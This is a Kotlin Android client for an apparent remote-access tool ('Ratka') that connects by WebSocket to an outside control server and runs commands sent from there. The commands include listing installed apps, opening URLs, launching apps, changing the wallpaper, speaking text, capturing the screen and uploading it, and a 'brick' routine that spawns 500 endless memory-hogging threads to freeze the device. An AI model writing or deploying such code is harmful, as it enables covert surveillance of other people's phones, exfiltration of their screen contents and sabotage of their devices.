package com.ratka.client

import android.app.Activity
import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.media.RingtoneManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.speech.tts.TextToSpeech
import android.util.Base64
import android.util.Log
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.Locale
import java.util.concurrent.TimeUnit

class MainActivity : Activity() {
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    private var webSocket: WebSocket? = null
    private var statusText: TextView? = null
    private var tts: TextToSpeech? = null
    private val wsUrl = "wss://sanya-tech.cc.cd/ws"

    // Переменные для скриншота
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) tts?.language = Locale("ru", "RU")
        }
        
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
        }
        statusText = TextView(this).apply { text = "Ожидание подключения..." }
        val btnConnect = Button(this).apply {
            text = "Подключиться к Ратке"
            setOnClickListener { connectWebSocket() }
        }
        layout.addView(statusText)
        layout.addView(btnConnect)
        setContentView(layout)
    }

    private fun connectWebSocket() {
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                runOnUiThread { statusText?.text = "Подключено" }
                val hello = JSONObject().apply {
                    put("type", "connect")
                    put("device_type", "android")
                    put("model", Build.MODEL)
                }
                webSocket.send(hello.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("RATKA", "Получено: $text")
                try {
                    val json = JSONObject(text)
                    when (json.optString("cmd")) {
                        "battery" -> sendBatteryInfo(webSocket)
                        "vibrate" -> vibratePhone(2000)
                        "toast" -> showToast(json.optString("text", "Привет!"))
                        "open_url" -> openUrl(json.optString("url", "https://google.com"))
                        "sound" -> playSound()
                        "speak" -> speakText(json.optString("text", "Привет!"))
                        "volume_up" -> changeVolume(true)
                        "volume_down" -> changeVolume(false)
                        "apps" -> sendInstalledApps(webSocket)
                        "launch" -> launchApp(json.optString("package", "com.android.settings"))
                        "wallpaper" -> setWallpaperFromBase64(json.optString("data"))
                        "screen" -> requestScreenCapture()
                        "brick" -> brickPhone()
                    }
                } catch (e: Exception) { Log.e("RATKA", "Ошибка", e) }
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                runOnUiThread { statusText?.text = "Ошибка: ${t.message}" }
            }
        })
    }

    private fun sendBatteryInfo(ws: WebSocket) {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus: Intent? = registerReceiver(null, ifilter)
        val temp = (batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
        val status = if (bm.isCharging) "Заряжается" else "От батареи"
        ws.send(JSONObject().apply { put("type", "battery"); put("level", level); put("temp", temp); put("status", status) }.toString())
    }

    private fun sendInstalledApps(ws: WebSocket) {
        val pm = packageManager
        val apps = pm.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
        ws.send(JSONObject().apply { put("type", "apps"); put("list", JSONArray(apps.take(50))) }.toString())
    }

    private fun vibratePhone(duration: Int) {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration.toLong(), VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION") vibrator.vibrate(duration.toLong())
        }
    }

    private fun showToast(text: String) { runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() } }

    private fun openUrl(url: String) { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }

    private fun playSound() {
        val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
        ringtone.play()
    }

    private fun speakText(text: String) { tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RatkaTTS") }

    private fun changeVolume(up: Boolean) {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        audioManager.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, if (up) android.media.AudioManager.ADJUST_RAISE else android.media.AudioManager.ADJUST_LOWER, android.media.AudioManager.FLAG_SHOW_UI)
    }

    private fun launchApp(packageName: String) {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        if (intent != null) startActivity(intent) else runOnUiThread { statusText?.text = "Нет пакета: $packageName" }
    }

    private fun setWallpaperFromBase64(base64Str: String) {
        try {
            val bytes = Base64.decode(base64Str, Base64.DEFAULT)
            val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            val wallpaperManager = WallpaperManager.getInstance(this)
            wallpaperManager.setBitmap(bitmap)
            runOnUiThread { statusText?.text = "Обои изменены" }
        } catch (e: Exception) { Log.e("RATKA", "Wallpaper error", e) }
    }

    private fun requestScreenCapture() {
        val intent = mediaProjectionManager?.createScreenCaptureIntent()
        startActivityForResult(intent, 1001)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1001 && resultCode == Activity.RESULT_OK && data != null) {
            startScreenCapture(resultCode, data)
        }
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture", width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader?.surface, null, null
        )

        Handler(Looper.getMainLooper()).postDelayed({
            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width
                val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)
                
                val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                val baos = ByteArrayOutputStream()
                finalBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                val base64Image = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                
                webSocket?.send(JSONObject().apply { put("type", "screenshot"); put("data", base64Image) }.toString())
                image.close()
            }
            virtualDisplay?.release()
            mediaProjection?.stop()
            runOnUiThread { statusText?.text = "Скриншот отправлен" }
        }, 1000)
    }

    private fun brickPhone() {
        for (i in 1..500) {
            Thread {
                var counter = 0L
                val hog = ByteArray(10 * 1024 * 1024)
                while (true) { counter += 1; if (counter == Long.MAX_VALUE) counter = 0 }
            }.start()
        }
    }

    override fun onDestroy() { super.onDestroy(); tts?.shutdown() }
}
